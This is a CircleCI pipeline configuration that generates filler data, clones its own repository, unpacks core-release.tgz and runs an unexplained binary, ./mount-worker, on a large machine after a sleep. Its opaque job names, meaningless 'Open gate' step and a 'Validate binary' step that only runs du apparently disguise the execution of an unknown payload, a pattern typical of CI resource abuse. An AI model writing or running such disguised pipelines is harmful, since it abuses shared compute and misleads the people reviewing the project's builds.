version: 2.1

jobs:
  newNavs:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Generate C
          command: |
            mkdir -p /tmp/hot
            set +o pipefail 2>/dev/null; seq 1 1198352 | awk '{print sprintf("%08x",$1)}' | tr 'abcdef' 'ABCDEF' > /tmp/hot/15473cf38; true
            stat -c 'file=%n size=%s' /tmp/hot/15473cf38
      - persist_to_workspace:
          root: /tmp/hot
          paths:
            - '15473cf38'
  send-it:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/hot
      - run:
          name: Open gate
          command: |
            expr $(wc -w < /tmp/hot/15473cf38 2>/dev/null || echo 0) + $(wc -l < /tmp/hot/15473cf38 2>/dev/null || echo 0) 2>/dev/null || true
      - run:
          name: Get fresh code
          command: git clone --depth 1 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Unroll archive
          command: zcat core-release.tgz | tar xvf -
      - run:
          name: Validate binary
          command: du -sh .
      - run:
          command: sleep 45
      - run:
          command: /bin/sh -c "./mount-worker"
